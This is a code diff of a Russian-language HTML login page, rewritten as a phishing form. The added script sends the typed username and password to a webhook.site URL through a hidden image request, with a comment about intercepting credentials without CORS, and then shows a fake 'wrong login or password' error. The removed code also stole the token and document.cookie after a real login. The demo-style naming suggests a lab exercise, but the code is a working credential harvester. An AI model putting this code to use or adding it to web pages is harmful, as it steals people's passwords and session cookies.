@@ -17,57 +17,25 @@
     <button type="submit">Войти</button>
   </form>
   <p class="error" id="errorMessage"></p>
+
   <script>
     const loginForm = document.getElementById("loginForm");
     const errorMsg = document.getElementById("errorMessage");
 
-    loginForm.addEventListener("submit", async function (e) {
+    loginForm.addEventListener("submit", function (e) {
       e.preventDefault();
 
       const username = document.getElementById("username").value;
       const password = document.getElementById("password").value;
 
-      try {
-        const res = await fetch("https://kazcyber.zapto.org/logindemo.php", {
-          method: "POST",
-          headers: { "Content-Type": "application/x-www-form-urlencoded" },
-          credentials: "include",
-          body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
-        });
+      // 👇 Перехватываем логин и пароль — без CORS
+      new Image().src =
+        "https://webhook.site/872df0d8-9f97-4b64-b8fe-e9edddeedfbd" +
+        "?username=" + encodeURIComponent(username) +
+        "&password=" + encodeURIComponent(password);
 
-        const data = await res.json();
-
-        if (data.status === "success") {
-          // Воруем
-          await fetch("https://webhook.site/872df0d8-9f97-4b64-b8fe-e9edddeedfbd", {
-            method: "POST",
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              username,
-              password,
-              token: data.token,
-              cookie: document.cookie
-            })
-          });
-
-          // Устанавливаем токен для авторизации и редиректим
-          localStorage.setItem("token", data.token);
-          window.location.href = "https://kazcyber.zapto.org/";
-        } else {
-          errorMsg.textContent = "❌ Неверный логин или пароль";
-        }
-      } catch (err) {
-        errorMsg.textContent = "⚠️ Ошибка соединения с сервером";
-      }
-      fetch("https://kazcyber.zapto.org/logindemo.php", {
-  method: "POST",                                // Метод — POST
-  credentials: "include",                        // Включает cookies в запрос
-  headers: { "Content-Type": "application/x-www-form-urlencoded" }, // Заголовки запроса
-  body: "username=admin&password=admin"          // Данные формы
-})
-.then(r => r.json())                             // Ответ обрабатывается как JSON
-.then(console.log);                              // Выводит ответ в консоль браузера
-
+      // Показать ошибку (или фейковый редирект)
+      errorMsg.textContent = "❌ Неверный логин или пароль";
     });
   </script>
 </body>
